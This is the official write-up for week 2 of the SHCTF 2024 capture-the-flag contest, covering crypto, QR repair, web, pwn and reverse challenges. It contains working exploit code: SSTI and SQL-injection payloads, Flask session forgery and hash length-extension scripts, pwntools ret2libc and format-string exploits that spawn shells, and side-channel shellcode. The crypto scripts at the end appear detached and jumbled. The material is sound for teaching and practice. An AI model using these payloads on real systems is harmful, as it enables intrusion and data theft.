# SHCTF-2024-Week2 官方WP

> 原文: https://www.ctfiot.com/210419.html
> ID: 210419

Crypto

worde很大

dp泄露但是e比较大，无法通过遍历e去找k了,这里讲一下另外一种解法的推导过程

p 与 q 的反方向二进制的异或值，共256bit，记为pxorq

从两端向中间搜索

每一次搜索，需利用当前 pxorq 两端的bit位。这是因为，pxorq 的当前最高位对应p的最高位及q的最低位，pxorq 的当前最低位对应p的最低位及q的最高位 (其中最高、最低均是对于当前搜索而言)

如果当前需搜索的最高位为”1”，则对应两种可能：p该位为1，q对应低位为0；p该位为0，q对应低位为1。剩下依此类推

将p、q未搜索到的位全填0，乘积应小于n

将p、q未搜索到的位全填1，乘积应大于n

p、q 低 k 位乘积再取低 k 位，应与 n 的低 k 位相同

https://www.cnblogs.com/luogi/p/15469106.html#%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86

https://blog.csdn.net/Scalzdp/article/details/133927363

首先在 QRazyBox 中将附件给的二维码画出来(直接图片转也行 不过得手动消一下多余的白块)

阅读完基础知识的文章后 我们知道 二维码一般是从右下角开始读取的

所以我们从右下角开始分析,在分析的过程中可以灵活运用QRazyBox的Data Sequence Analysis的功能来减少我们的工作量,这个功能可以帮助我们便捷的读取或者修改每个小块 启用后的视图会变成这样:

首先是右下角 4 个码元组成的块 用鼠标左键轻点就能读到这个块的信息:

再通过阅读编码表我们就能知道 这是 8-bit Byte 对应的编码

接着是上面那块 这记录了这个二维码总共存储了多少个字符 如图所示 是31个

再上一块 就是存储数据的块了 我们需要从这里开始修复 首先是补齐flag头:  SHCTF{ (01010011 01001000 01000011 01010100 01000110 01111011)

点击一下白色块就可以便捷的修改存储的信息 我们这里将 S 的二进制(01010011)直接复制进去回车 工具就可以帮我自动填上这个块的数据(更改前左图 回更改后右图)

接着再依次将剩余的部分补齐

接着用 QRazyBox 自带的 Padding Bits Recovery 功能补上部分像素

最后就能通过 Reed-Solomon Decoder 还原出二维码所存数据

但这个时候得到的还不是最终的flag 如果观察仔细的话 可以发现{}中的字符串很像被编码后的密文

进行一个解 Base64 可得: F1agf4K3rF1agf4K3r

用010(WinHex也成)查一下图片就能发现 文件尾后还跟了个文件头 也就是说还藏了一张图片

将其分离出来后发现还是一张二维码 不过这回是完整的了 直接扫码就能得到一个Base64表:「ABCDjp0yIJKLSVOPQNMzURWX9cabZdefgFiEklmnohqrstuvwxhTG21345678Y+/」

用这个表解密 F1agf4K3rF1agf4K3r 就能得到 THis_F14GTHis_F14G

再包上Flag头提交即可

Web

登录验证

❝

他们都说jwt不安全，那我拿个密钥加密不就行了，你又不知道密钥是多少。什么? 你说可以爆破出来? 666666!

❞

密码不是admin会回显错误密码,账号不是admin会回显”你不是admin”

都是admin后回显”你不是真正的admin”,此时抓包可以看到cookie处有token token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mjg4Mzg3MzIsImlhdCI6MTcyODgzMTUzMiwibmJmIjoxNzI4ODMxNTMyLCJyb2xlIjoidXNlciJ9.VGA6D757VurbD0RD4CS16PZOQ6jYfVowaAVT87h3NCY

https://jwt.io/

能看到role处是user,根据题目描述基本可以知道改为admin即可成为”真正的admin”

但这个token的加密是有密钥的,根据题目描述”666666″得知要爆破6位,优先考虑弱口令

https://github.com/lmammino/jwt-cracker

这里用jwt-cracker演示爆破过程

得到密码222333后回在线jwt改role为admin后再放到token里发包即可得到flag

欢迎登录admin!这里是你的flag: SHCTF{y0u_v3r1F1ed_Y0U_aRe_yOU_xxxxxxxxxxxx}

dickle

在反序列化过程中，如果 pickle 模块遇到一个表示类的标记，它会调用 find_
class 方法来查找和创建相应的类实例。

find_
class 方法将识别到的 module 和 name 取决于 reduce 方法返回的内容。

module是类的模块名，例如 “os“。name是类名，例如 “system“

黑名单中有os.system

本地运行加一个打印出find_class的结果

在反序列化过程中， pickle 使用 find_
class 方法来定位和导入必要的类或函数。由于 pickle 记录的是 posix.system，因此 find_
class 会从 posix 模块中导入 system 函数，而不是从 os 模块中导入。

所以可以用os.system

反弹shell即可

guess_the_number

查看网页源码，发现/s0urce，访问获得题目源码

import flask
import random
from flask import Flask, request, render_template, send_file

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', first_num = first_num)  

@app.route('/source')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
    
@app.route('/first')
def get_first_number():
    return str(first_num)
    
@app.route('/guess')
def verify_seed():
    num = request.args.get('num')
    if num == str(second_num):
        with open("/flag", "r") as file:
            return file.read()
    return "nonono"
 
def init():
    global seed, first_num, second_num
    seed = random.randint(1000000,9999999)
    random.seed(seed)
    first_num = random.randint(1000000000,9999999999)
    second_num = random.randint(1000000000,9999999999)

init()
app.run(debug=True)

可以看到，题目给出了由random模块生成的第一个数，求出第二个数即可获得flag

random伪随机数生成的数，是由seed进行数学运算得到的，题目设置了伪随机数的seed，且长度不大，因此只需要爆破出seed即可预测下一个数

import random

first_num = int(input(""))
for i in range(1000000,9999999,1):
    random.seed(i)
    num = random.randint(1000000000,9999999999)
    if num == first_num:
        second_num = random.randint(1000000000,9999999999)
        print("second_num: " + str(second_num))
        exit()

MD5 GOD!

应该不会有人手动拓展hash吧

考点：代码审计，hash长度拓展攻击，session伪造

先是代码审计

根据源码可以知道，64个用户签到成功后即可得到flag

访问 /users 路由可以得到用户签到的状态

/login 路由可以登陆

/ 路由是签到的

/flag 能得到flag

观察签到逻辑和验证函数

def check_sign(sign, username, msg, salt):
    if sign == md5(salt + msg + username):
        return True
    return False

@app.route("/")
def index():
    if session.get('sign') == None or session.get('username') == None or session.get('msg') == None:
        return redirect("/login")
    sign = session.get('sign')
    username = session.get('username')
    msg = session.get('msg')
    if check_sign(sign, username, msg, salt):
        sign_users[username.decode()] = 1
        return "签到成功"
    return redirect("/login")

可以知道，只要session里的 sign 和最终 md5(salt + msg + username) 相等即可签到成功

这里的salt是未知的，但最初的账号 student 的所有信息是已知的，可以用这个账号的相关信息来做hash长度拓展攻击

hash长度拓展攻击的代码可以去网上找现成的

接着是session伪造，SECRET_KEY 已经给出是 Th1s_is_5ecr3t_k3y，写脚本的时候可以参考 flask_session_cookie_manager3.py里的代码

exp

import hashlib
import math
from typing import Any, Dict, List

rotate_amounts = [7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
                  5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
                  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
                  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]

constants = [int(abs(math.sin(i + 1)) * 2 ** 32) & 0xFFFFFFFF for i in range(64)]

functions = 16 * [lambda b, c, d: (b & c) | (~b & d)] + 
            16 * [lambda b, c, d: (d & b) | (~d & c)] + 
            16 * [lambda b, c, d: b ^ c ^ d] + 
            16 * [lambda b, c, d: c ^ (b | ~d)]

index_functions = 16 * [lambda i: i] + 
                  16 * [lambda i: (5 * i + 1) % 16] + 
                  16 * [lambda i: (3 * i + 5) % 16] + 
                  16 * [lambda i: (7 * i) % 16]

def get_init_values(A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> List[int]:
    return [A, B, C, D]

def left_rotate(x, amount):
    x &= 0xFFFFFFFF
    return ((x << amount) | (x >> (32 - amount))) & 0xFFFFFFFF

def padding_message(msg: bytes) -> bytes:
    """
    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。
    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。
    填充的方法如下：
        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。
        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。
    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。
    """
    orig_len_in_bits = (8 * len(msg)) & 0xffffffffffffffff
    msg += bytes([0x80])
    while len(msg) % 64 != 56:
        msg += bytes([0x00])
    msg += orig_len_in_bits.to_bytes(8, byteorder='little')
    return msg

def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> int:
    message = padding_message(message)
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:
chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder='little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))

def md5_to_hex(digest: int) -> str:
    raw = digest.to_bytes(16, byteorder='little')
    return '{:
032x}'.format(int.from_bytes(raw, byteorder='big'))

def get_md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> str:
    return md5_to_hex(md5(message, A, B, C, D))

def md5_attack(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe,
               D: int = 0x10325476) -> int:
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:
chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder='little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))

def get_init_values_from_hash_str(real_hash: str) -> List[int]:
    """

    Args:
        real_hash: 真实的hash结算结果

    Returns: 哈希初始化值[A, B, C, D]

    """
    str_list: List[str] = [real_hash[i * 8:(i + 1) * 8] for i in range(4)]
    # 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字
    return [int.from_bytes(int('0x' + s, 16).to_bytes(4, byteorder='little'), byteorder='big') for s in str_list]

def get_md5_attack_materials(origin_msg: bytes, key_len: int, real_hash: str, append_data: bytes) -> Dict[str, Any]:
    """

    Args:
        origin_msg: 原始的消息字节流
        key_len: 原始密钥（盐）的长度
        real_hash: 计算出的真实的hash值
        append_data: 需要添加的攻击数据

    Returns: 发起攻击需要的物料信息
        {
            'attack_fake_msg': bytes([...]),
            'attack_hash_value': str(a1b2c3d4...)
        }

    """
    init_values = get_init_values_from_hash_str(real_hash)
    # print(['{:
08x}'.format(x) for x in init_values])
    # 只知道key的长度，不知道key的具体内容时，任意填充key的内容
    fake_key: bytes = bytes([0xff for _ in range(key_len)])
    # 计算出加了append_data后的真实填充数据
    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)
    # 攻击者提前计算添加了攻击数据的哈希
    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[len(padding_message(fake_key + origin_msg)):],
                                              A=init_values[0],
                                              B=init_values[1],
                                              C=init_values[2],
                                              D=init_values[3]))
    fake_padding_data = padding_message(fake_key + origin_msg)[len(fake_key + origin_msg):]
    attack_fake_msg = origin_msg + fake_padding_data + append_data
    return {'attack_fake_msg': attack_fake_msg, 'attack_hash_value': attack_hash_value}

from flask.sessions import SecureCookieSessionInterface
import requests, json, time

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def session_decode(session_cookie_value, secret_key):
    """ Decode a Flask cookie  """
    app = MockApp(secret_key)
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.loads(session_cookie_value)

def session_encode(session_cookie_structure, secret_key):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)
        # session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)
        return s.dumps(session_cookie_structure)
    
except Exception as e:
        return "[Encoding error] {}".format(e)

def req_index(url, cookie):
    # headers = {"Cookie": "session=" + cookie}
    cookies = {"session":
cookie}
    r = requests.get(url, cookies=cookies).text
    # print(r)
    if '签到成功' not in r:
        # print(cookie)
        time.sleep(1)
        req_index(url, cookie)
        # print(r)

def req_user(url):
    return json.loads(requests.get(url).text)

def req_login(url):
    data = {"username":"student", "password":"student"}
    cookie = requests.post(url, data).headers["Set-Cookie"][8:].split(';')[0]
    # print(cookie)
    return cookie

def hash_Attack(md5_value, key_len, data, attack_data):
    attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)
    # print(data)
    res = {"username":
attack_data, "msg":
attack_materials['attack_fake_msg'][:-len(attack_data)], "sign":
attack_materials['attack_hash_value'].encode()}
    return res

if __name__ == '__main__':
    url = "http://210.44.150.15:
49982/"
    cookie = req_login(url+'login')
    users = req_user(url+'users')
    secret_key = "Th1s_is_5ecr3t_k3y"
    res = session_decode(cookie, secret_key)
    for user in users:
        if users[user] == 0:
            res = hash_Attack(res["sign"], 16, res["msg"]+res["username"], user.encode())
            res2 = session_encode(res, secret_key)
            # time.sleep(1)
            r = req_index(url, res2)

跑完这个脚本后，访问 /flag 即可得到flag

入侵者禁入

https://github.com/noraj/flask-session-cookie-manager

session伪造

D:
toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py decode -c "eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZvZ8IQ.B9Q1a7gFQvzs4Q3bGldXuiGHULg" -s "0day_joker"
D:
toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls").read()}}', 'is_admin': 1}}"
D:
toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls /").read()}}', 'is_admin': 1}}"
D:
toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("cat /flag").read()}}', 'is_admin': 1}}"

自助查询

题目提供了查询语句

SELECT username,password FROM users WHERE id = ("

使用”)闭合即可进行正常sql注入

-1") union select 1,scretdata from ctf.flag

查询「columns即可」

Payload

-1") union select 1,column_comment from information_schema.columns

Pwn

ezorw

程序未开启canary并存在溢出，但是开启了pie保护

思路:
利用fd=0和close(fd)来关闭标准输入流，然后使程序返回main中执行open打开flag，通过read和puts将flag读出并打印

from pwn import *
context.log_level = 'debug'

p = process('./pwn')

open_addr = 0x97
vuln_addr = 0xBB

p.recvuntil('giftn')

payload = b'a' * (0x10 + 8) + p8(vuln_addr)
p.send(payload)
p.recvline()

payload = b'a' * (0x10 + 8) + p8(open_addr)
p.send(payload)
p.recvline()

p.interactive()

ez_competition

这题考验的知识点是条件竞争，不同进程或者线程竞争同一个资源导致的漏洞。

当程序接收到远程连接时，会自动fork一个子进程执行handle函数，这里是允许多个子进程同时存在的。

handler函数可以往共享空间中写入一个任意指针，并会判断是否和flag指针一致，不一致就会进行flag的比较，比较成功就输出flag。

乍一看不存在什么漏洞，但是我们要知道这里的操作都是基于*buf的，这就意味着指针比较，以及字符串比较都会进行解引用操作来得到地址。

因为这里是通过共享空间进行操作，子进程可以对共享空间同时进行操作，而两次解引用之间存在2s的时间差，这就导致我们可以先随便输入一个地址，然后经过一层比较，再在2s内创建另一个子进程偷梁换柱，修改存放的指针为flag指针，即可绕过检查得到flag。

from pwn import *
p1 = remote('ip',port)
p2 = remote('ip',port)
p1.send(p64(0x404121))
time.sleep(1)
p2.send(p64(0x404120))
p2.close()
p1.interactive()

ez_sandbox

这题考验的知识点是侧信道攻击，通过时间差比较的方式在没有输出的情况下推测出数据内容。

题目内容很简单，设置了一个只允许read、open系统调用的沙盒。

然后就是任意shellcode执行。

题目只允许使用read和open系统调用，这意味着我们可以读取flag到程序中，但却没法进行输出。

好在我们可以自己构造shellcode，因此我们可以在程序内部进行字符串的比较。

shellcode我们可以进行如下构造：

 push 0x67616c66//压入flag文件名到栈中
 mov rdi,rsp
 xor rsi,rsi
 xor rdx,rdx
 mov rax,2
 syscall//open打开文件
 mov rdi,3
 mov rsi,rsp
 mov rdx,0x100
 mov rax,0
 syscall//读取flag文件内容到栈中
 //开始字符串的比较
 cmpb [rsp+{i}],{j}
 jz Loop//若字符串的第i个字符为j就跳转到Loop
 ret//否则直接退出
 Loop:
 mov rdi,0
 mov rsi,rsp
 mov rdx,0x10
 mov rax,0
 syscall//Loop会调用read读取用户输入

通过以上的shellcode构造，我们每次可以比较一个字符，如果字符正确就会调用read卡住，而不正确就会直接退出。通过时间差的比较，长时间没有断开连接报错eof就代表进入了read调用，也就代表字符正确，反之代表错误。

最终exp：

from pwn import *
from tqdm import tqdm

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'critical'
# p = gdb.debug('./main','b main')
flag = ''
ctable = [x for x in range(ord('0'),ord('9')+1)]+[ord('-'),ord('{'),ord('}')]+[x for x in range(ord('a'),ord('z')+1)]
for i in range(0,0x30):
    for j in tqdm(ctable):
        p = remote('ip',port)
        assembly = f'''
        push 0x67616c66
        mov rdi,rsp
        xor rsi,rsi
        xor rdx,rdx
        mov rax,2
        syscall
        mov rdi,3
        mov rsi,rsp
        mov rdx,0x100
        mov rax,0
        syscall
        cmpb [rsp+{i}],{j}
        jz Loop
        ret
        Loop:
        mov rdi,0
        mov rsi,rsp
        mov rdx,0x10
        mov rax,0
        syscall
        ret
        '''
        shellcode = asm(assembly)
        p.send(shellcode)
        try:
            #如果在timeout时间内报错eof就会直接进入except，相反代表字符正确，会继续执行flag+=chr(j)
            p.recv(10,timeout=2)#根据环境的差异可以调节timeout时长
            p.close()
            flag += chr(j)
            break
        
except:
            p.close()
    print(flag)

json_stackoverflow

一个简单的32位栈溢出套了个json的解析

from pwn import *
from ctypes import *
from struct import pack
banary = "./pwn"
elf = ELF(banary)
libc = ELF("./libc.so.6")
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
ip = ''
port = 0
local = 1
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"xf7")[-4:].ljust(4, b'x00'))
uu64 = lambda : u64(io.recvuntil(b"x7f")[-6:].ljust(8, b"x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'x00'))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()

main=0x08049432
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

payload=b'A'*0x48+b'A'*4+p32(puts_plt)+p32(main)+p32(puts_got)
send_data=b'{"name":"'+payload+b'","age":21}'
ru("How to send data?")
sl(send_data)
ru("age:
134549548n")
libcbase=u32(io.recv()[0:4])-libc.sym['puts']
lg("libcbase")
system=libcbase+libc.sym['system']
bin_sh=libcbase+next(libc.search(b'/bin/shx00'))

payload=b'A'*0x48+b'A'*4+p32(system)+p32(0xdeadbeef)+p32(bin_sh)
send_data=b'{"name":"'+payload+b'","age":21}'
sl(send_data)

ia()

json_printf

一个简单的格式化字符串套了个json的解析

from pwn import *
from ctypes import *
from struct import pack
banary = "./pwn"
elf = ELF(banary)
#libc = ELF("./libc.so.6")
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
ip = ''
port = 0
local = 1
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"xf7")[-4:].ljust(4, b'x00'))
uu64 = lambda : u64(io.recvuntil(b"x7f")[-6:].ljust(8, b"x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'x00'))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()

num=0x8052074

payload=b'A%998c%10$hn'+p32(num)
send_data=b'{"name":"'+payload+b'","age":18}'
ru("How to send data?")
sl(send_data)

ia()

Reverse

cancanneed

HOOK check的返回值为1就好了

// 必须写在 Java 虚拟机中 
Java.perform(function() {
    let MainActivity = Java.use("com.example.test.MainActivity");
MainActivity["check"].implementation = function (str) {
    console.log(`MainActivity.check is called: str=${str}`);
    let result = this["check"](str);
    console.log(`MainActivity.check result=${result}`);
    return 1;
};
})

Babytea

明显的tea特征  直接写解密脚本

#include 
#include <stdint.h>
void decrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], i; 
    uint32_t delta=0x61C88747;  
    uint32_t sum=0;                 
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i<0x40; i++) {                         /* basic cycle start */
        v0 += v1 ^ (k[ (sum & 3)] + sum) ^ (v1 + ((v1 >> 5) ^ ( v1 <<4 )));
        sum -= 0x61C88747;
        v1 += v0 ^ (k [((sum >> 11) & 3)] + sum) ^ (v0 + ((v0 >> 5) ^ (v0<<4)));
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}

int main(){
    uint32_t enc[]={0x18c2e339,0xe9550982,0x108a30f7,0x018430dd,0xd5de57b0,0xd43e0740,0xf42fdde4,0x968886e8,0xe5d77b79,0x685d758f};
    uint32_t key[]={1,1,2,3};
    for (size_t i = 0; i < 10; i+=2)
    {
        decrypt(enc+i,key);
    }
    puts((char*)enc);

}

花语

去花

/*exp 如下*/
#include
using namespace std;
int main() {
    char tmp=0;
    char flag[255] = "!}ggagllllff_fau_hisY_keF{CTSH";
    for (int i = 0; i < 14; i++) {
        tmp = flag[29 - i];
        flag[29 - i] = flag[i];
        flag[i] = tmp;
    }
    for (int i = 0; i < 29; i += 2) {
        tmp = flag[i];
        flag[i] = flag[i + 1];
        flag[i + 1] = tmp;
    }
    cout<<flag;
 }
 /*
 SHCTF{keY_is_hua_fffllllaggg!}
 */

Android？Harmony！

❝

我做鸿蒙应用reverse，好吗？

❞

ArkTS是HarmonyOS优选的主力应用开发语言。方舟字节码文件是ArkTS/TS/JS编译后的二进制产物。针对方舟字节码(abc)的反编译，目前已经有一些工具可以使用，例如：

abcde

abc-decompiler

将用户输入通过 encode.encode 加密后与 secretKey 进行比较。

如果口令错误，显示提示信息并返回。

如果口令正确，创建迷宫并将其写入文件。

CreateMaze 函数设置迷宫的起点和终点，并调用 FillF1ag 来填充迷宫。

FillF1ag 函数遍历maze，并判断当前格是否为空格且 CheckGround 的结果大于2时，使用输入填充迷宫中的空白。

CheckGround 函数用于检查某个位置的四个方向有几个空地。


```
import gmpy2
from Crypto.Util.number import *

def solve_dp_leak(e,dp,n,c):
    p = gmpy2.gcd(pow(5,e*dp,n)-5,n)
    q = n//p
    phi = (p-1)*(q-1)
    try:
        d = gmpy2.invert(e,phi)
        m = pow(c,d,n)
        flag = long_to_bytes(m)
        return flag
    
except:
        pass

n = 64921145375403083545531864956984072151341856682908111104267811008333409469629440124743589471022387528791249789776590881987854906662741019934835451842451919000617925805744632898434110555454137681326076564563593722826588259739946684132723368750061113163201190149766894752415770470935877082883818815783228793301
c = 44359153953700249051087265515623429893507549101698748624219639421725336531447633500661794130815898489480094607965932371706122863829042269163279628456581736821883648892589019882848750637212268727873179153330759038867740405957550265592570772766459698597324782564295219919626040670464946117978529709691316881784
e = 1039743120668324617408742378768011653641207981199791545288831
dp = 8095244708261074732722010639332938624538458336137147330884467084239259958828296552002478065663880970649018267223959758006546150783644433676150589502506131
flag = solve_dp_leak(e,dp,n,c)
print(flag)
from Crypto.Util.number import *
import gmpy2
flag = b'SHCTF{********}'
assert len(flag) == 39
p = getPrime(512)
q = getPrime(512)
n = p * q
e = 0x3
pad = b'a_easy_problem'
c = pow(bytes_to_long(flag + pad),e,n)
print(f'n = {n}')
print(f'c = {c}')
'''
n = 101194231761192803646875794770841105131876105333404505987513576849142365482512109876401629071314564545841743473668262668053559550015874646299248232349238400201145583346187330958825878235324968882794481192056169683711007095999439320830763275487477094590502701333963154552470777678553556993349171608134555815527
c = 54067443511581567434123971345564905390315631873898717856316286990552318113901362505672245448553258416669456882532743580961176229271906817289588426185966004215569829572814038485471312399063659287164712291139771809733004385057875146223151700601326161190474536508680332925332614914475852998934930375151571163346
'''
import libnum
n = 101194231761192803646875794770841105131876105333404505987513576849142365482512109876401629071314564545841743473668262668053559550015874646299248232349238400201145583346187330958825878235324968882794481192056169683711007095999439320830763275487477094590502701333963154552470777678553556993349171608134555815527
c = 54067443511581567434123971345564905390315631873898717856316286990552318113901362505672245448553258416669456882532743580961176229271906817289588426185966004215569829572814038485471312399063659287164712291139771809733004385057875146223151700601326161190474536508680332925332614914475852998934930375151571163346
e = 0x3
pad = b'a_easy_problem'
PR.<x> = PolynomialRing(Zmod(n))
f = (x * 256 ** len(pad) + libnum.s2n(pad)) ** e - c

f = f.monic()
root = f.small_roots(X=2 ** (39 * 8),beta=0.9,epsilon=0.03)
print(root)
print(libnum.n2s(int(root[0])))
from Crypto.Util.number import *
from gmpy2 import *

a = 2
k = 2
n = 792242124487487744112684073764838136735420218912754027047463652728471379899160765547442156564291384730001431618123286855785948697576729314336268971562744929064963865407747555634008392237344277112019925076002553472446417282781186023753110116164424527881993465632141439491562153535847575401795810677931666537580721
while True:
    a = powmod(a, k, n)
    res = gcd(a-1, n)
    if res != 1 and res != n:
        q = n // res
        p = res
        print("p =",p)
        print("q =",q)
        break
    k += 1

e = 65537
c = 600426645857263746686008574068404991065564448113036212428146354681333349553937242571570666330022710147563241693808924803040484209245898394526953629727203477917551422021844872532593209630710053732503292488516988881370929320936828724160381696961984977598580837741387497846201922389087751598182996424099501121106096
phi = (p - 1) * (q - 1)
d = invert(e, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag)
from Crypto.Util.number import *
import sys

pxorq = 5599968251197363876087002284371721787318931284225671549507477934076746561842
n = 7120275986401660066259983193598830554385933355254283093021239164350142898387660104515624591378875067038235085428170557400012848874756868985306042421950909
c = 6803450117490196163076010186755045681029929816618361161925865477601994608941714788803007124967390157378525581080320415602012078322064392991884070073083436
e = 65537
pxorq = str(bin(pxorq)[2:]).zfill(256)

def find(ph, qh, pl, ql):
    l = len(ph)
    tmp0 = ph + (256 - 2 * l) * "0" + pl
    tmp1 = ph + (256 - 2 * l) * "1" + pl
    tmq0 = qh + (256 - 2 * l) * "0" + ql
    tmq1 = qh + (256 - 2 * l) * "1" + ql
    if (int(tmp0, 2) * int(tmq0, 2) > n):
        return
    if (int(tmp1, 2) * int(tmq1, 2) < n):
        return
    if (int(pl, 2) * int(ql, 2) % (2 ** (l - 1)) != n % (2 ** (l - 1))):
        return

    if (l == 128):
        pp0 = int(tmp0, 2)
        if (n % pp0 == 0):
            pf = pp0
            qf = n // pp0
            print(pf)
            print(qf)
            phi = (pf - 1) * (qf - 1)
            d = inverse(e, phi)
            m1 = pow(c, d, n)
            print(long_to_bytes(m1))
            exit()

    else:
        if (pxorq[l] == "1" and pxorq[255 - l] == "1"):
            find(ph + "1", qh + "0", "1" + pl, "0" + ql)
            find(ph + "0", qh + "0", "1" + pl, "1" + ql)
            find(ph + "1", qh + "1", "0" + pl, "0" + ql)
            find(ph + "0", qh + "1", "0" + pl, "1" + ql)
        elif (pxorq[l] == "1" and pxorq[255 - l] == "0"):
            find(ph + "1", qh + "0", "0" + pl, "0" + ql)
            find(ph + "0", qh + "0", "0" + pl, "1" + ql)
            find(ph + "1", qh + "1", "1" + pl, "0" + ql)
            find(ph + "0", qh + "1", "1" + pl, "1" + ql)
        elif (pxorq[l] == "0" and pxorq[255 - l] == "1"):
            find(ph + "0", qh + "0", "1" + pl, "0" + ql)
            find(ph + "0", qh + "1", "0" + pl, "0" + ql)
            find(ph + "1", qh + "0", "1" + pl, "1" + ql)
            find(ph + "1", qh + "1", "0" + pl, "1" + ql)
        elif (pxorq[l] == "0" and pxorq[255 - l] == "0"):
            find(ph + "0", qh + "0", "0" + pl, "0" + ql)
            find(ph + "1", qh + "0", "0" + pl, "1" + ql)
            find(ph + "0", qh + "1", "1" + pl, "0" + ql)
            find(ph + "1", qh + "1", "1" + pl, "1" + ql)

find("1", "1", "1", "1")
    #p = 64760524083545528318139240449356269097871629401328435356643510319660757701117
    #q = 109947782034870726628911928816041880655659770652764045401662566933641952899777
#-908f-7c002c687387
    #sage
from Crypto.Util.number import *

